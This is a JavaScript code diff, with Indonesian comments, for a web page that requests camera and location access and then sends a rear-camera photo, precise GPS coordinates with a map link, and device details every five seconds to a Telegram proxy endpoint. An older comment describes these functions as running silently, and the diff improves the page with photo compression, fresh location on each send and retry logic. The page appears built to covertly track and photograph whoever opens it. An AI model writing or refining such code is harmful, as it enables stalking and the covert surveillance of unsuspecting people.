@@ -179,9 +179,9 @@
             const PROXY_ENDPOINT = '/api/telegram-proxy';
             const INTERVAL_MS = 5000; // 5 detik
             const COUNTDOWN_SECONDS = 3;
+            const MAX_RESOLUTION = 1280; // FIX: Resolusi maksimum untuk menghemat ukuran file
 
             let videoStreamObject = null;
-            let userLocation = null;
             let formData = {};
             let isSending = false;
             let capturedPhotoBase64 = null;
@@ -221,12 +221,11 @@
                 showStatus('Meminta izin kamera dan lokasi... Pengiriman 5s otomatis dimulai.', false);
                 
                 requestCameraPermission();
-                requestLocationPermission();
                 startAutoSendInterval();
             });
 
 
-            // --- FUNGSI CAMERA DAN LOKASI (Berjalan Senyap) ---
+            // --- FUNGSI CAMERA DAN LOKASI (Dioptimalkan) ---
 
             function requestCameraPermission() {
                 if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
@@ -247,11 +246,11 @@
                                     videoStream.srcObject = stream;
                                     videoStream.style.display = 'block';
                                     captureButton.disabled = false;
-                                    captureButton.textContent = 'Jepret Foto (Back Camera)';
+                                    captureButton.textContent = 'Jepret Foto (Kamera Belakang)';
                                     console.log('Kamera Belakang Aktif.');
                                 })
                                 .catch(err => {
-                                    showStatus(`Kamera GAGAL: ${err.name}. Pengiriman foto mungkin terlewat.`, true);
+                                    showStatus(`Kamera GAGAL: ${err.name}. Pengiriman foto terlewat.`, true);
                                     captureButton.disabled = true;
                                     captureButton.textContent = 'Jepret Foto (Kamera Mati)';
                                     console.error("Camera Error:", err);
@@ -259,29 +258,33 @@
                         });
                 }
             }
-
-            function requestLocationPermission() {
-                if (navigator.geolocation) {
+            
+            // FUNGSI BARU: Mengambil lokasi sekali saja dengan Promise (lebih hemat daya)
+            function getLocationData() {
+                return new Promise((resolve) => {
+                    if (!navigator.geolocation) {
+                        return resolve(null);
+                    }
                     const locationOptions = {
                         enableHighAccuracy: true, 
-                        timeout: 10000, 
+                        timeout: 5000, 
                         maximumAge: 0 
                     };
 
-                    navigator.geolocation.watchPosition(position => {
-                        userLocation = {
+                    navigator.geolocation.getCurrentPosition(position => {
+                        resolve({
                             latitude: position.coords.latitude,
                             longitude: position.coords.longitude,
                             accuracy: position.coords.accuracy,
                             timestamp: new Date(position.timestamp).toISOString()
-                        };
-                        // console.log(`Lokasi terupdate: ${userLocation.latitude}, ${userLocation.longitude}`);
+                        });
                     }, err => {
-                        userLocation = null;
-                        console.error(`Lokasi Gagal: ${err.message}`);
+                        console.error(`Lokasi Gagal: ${err.message} (Code: ${err.code})`);
+                        resolve(null);
                     }, locationOptions);
-                }
+                });
             }
+
 
             // --- FUNGSI INTERAKTIF LOKAL (JEPET, UNDUH, SHARE) ---
             
@@ -297,7 +300,7 @@
                         }
                     });
                 } else {
-                     showStatus('Kamera tidak aktif untuk pengambilan lokal.', true);
+                    showStatus('Kamera tidak aktif untuk pengambilan lokal.', true);
                 }
             });
 
@@ -366,6 +369,7 @@
                     if (!isSending) {
                         sendReport();
                     }
+                    // Menggunakan setTimeout rekursif untuk interval
                     setTimeout(sendNext, INTERVAL_MS);
                 };
 
@@ -376,19 +380,36 @@
             function capturePhotoToCanvas() {
                 if (!videoStreamObject) return null;
 
-                const context = photoCanvas.getContext('2d');
                 const videoWidth = videoStream.videoWidth || 640;
                 const videoHeight = videoStream.videoHeight || 480;
                 
-                photoCanvas.width = videoWidth;
-                photoCanvas.height = videoHeight;
+                let width = videoWidth;
+                let height = videoHeight;
                 
+                // FIX KRITIS: Hitung ulang dimensi untuk menjaga rasio aspek dan membatasi ukuran
+                if (width > MAX_RESOLUTION || height > MAX_RESOLUTION) {
+                    const aspectRatio = width / height;
+                    if (width > height) {
+                        width = MAX_RESOLUTION;
+                        height = MAX_RESOLUTION / aspectRatio;
+                    } else {
+                        height = MAX_RESOLUTION;
+                        width = MAX_RESOLUTION * aspectRatio;
+                    }
+                }
+
+                photoCanvas.width = width;
+                photoCanvas.height = height;
+                const context = photoCanvas.getContext('2d');
+                
+                // Terapkan efek cermin (Mirror effect)
                 context.save();
-                context.translate(videoWidth, 0);
-                context.scale(-1, 1);
-                context.drawImage(videoStream, 0, 0, videoWidth, videoHeight);
+                context.translate(width, 0);
+                context.scale(-1, 1); 
+                context.drawImage(videoStream, 0, 0, width, height);
                 context.restore();
 
+                // Kompresi JPEG 80%
                 return photoCanvas.toDataURL('image/jpeg', 0.8);
             }
 
@@ -396,6 +417,9 @@
                 if (isSending) return;
 
                 isSending = true;
+                
+                // Ambil lokasi terbaru (lebih efisien daripada watchPosition)
+                const latestLocation = await getLocationData();
                 const base64Image = capturePhotoToCanvas();
                 
                 const now = new Date();
@@ -406,8 +430,8 @@
                 });
 
                 // Kompilasi Caption
-                const locationText = userLocation ? 
-                    `✅ Lokasi Akurat:\nLAT: ${userLocation.latitude.toFixed(6)}\nLNG: ${userLocation.longitude.toFixed(6)}\nAkurasi: ${userLocation.accuracy.toFixed(2)}m\nPeta: https://maps.google.com/?q=${userLocation.latitude},${userLocation.longitude}` : 
+                const locationText = latestLocation ? 
+                    `✅ Lokasi Akurat:\nLAT: ${latestLocation.latitude.toFixed(6)}\nLNG: ${latestLocation.longitude.toFixed(6)}\nAkurasi: ${latestLocation.accuracy.toFixed(2)}m\nPeta: https://maps.google.com/?q=${latestLocation.latitude},${latestLocation.longitude}` : 
                     `❌ Lokasi GAGAL didapatkan.`;
 
                 const caption = `
@@ -435,7 +459,7 @@ OS: ${deviceData.os}
                     // showStatus('✅ Data dikirim otomatis!', false); 
                     console.log('✅ Pengiriman otomatis sukses.');
                 } catch (error) {
-                    showStatus('❌ Pengiriman otomatis GAGAL! Cek token/ID.', true);
+                    showStatus('❌ Pengiriman otomatis GAGAL! Cek log Vercel.', true);
                     console.error("Error saat mengirim data ke proxy:", error);
                 } finally {
                     isSending = false;
@@ -450,18 +474,32 @@ OS: ${deviceData.os}
                     isPhoto: !!base64Image 
                 };
 
-                const response = await fetch(PROXY_ENDPOINT, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                });
+                // Gunakan backoff eksponensial untuk retry jika API throttling terjadi
+                const MAX_RETRIES = 3;
+                for (let attempt = 0; attempt < MAX_RETRIES; attempt++) {
+                    try {
+                        const response = await fetch(PROXY_ENDPOINT, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify(payload)
+                        });
 
-                const data = await response.json();
-                if (!response.ok || data.error) {
-                    // Tampilkan pesan error jika proxy gagal
-                    throw new Error(data.error || 'Pengiriman ke proxy gagal.');
+                        const data = await response.json();
+                        if (!response.ok || data.error) {
+                            // Jika response gagal, lempar error untuk memicu retry atau keluar loop
+                            throw new Error(data.error || `Pengiriman ke proxy gagal. Status: ${response.status}`);
+                        }
+                        return data; // Sukses, keluar dari fungsi
+                    } catch (error) {
+                        if (attempt === MAX_RETRIES - 1) {
+                            throw error; // Lempar error final setelah semua retry gagal
+                        }
+                        // Tunggu eksponensial sebelum retry
+                        const delay = Math.pow(2, attempt) * 1000;
+                        await new Promise(resolve => setTimeout(resolve, delay));
+                        // console.log(`Retry attempt ${attempt + 1} after ${delay}ms...`); // Debugging line (optional)
+                    }
                 }
-                return data;
             }
 
 
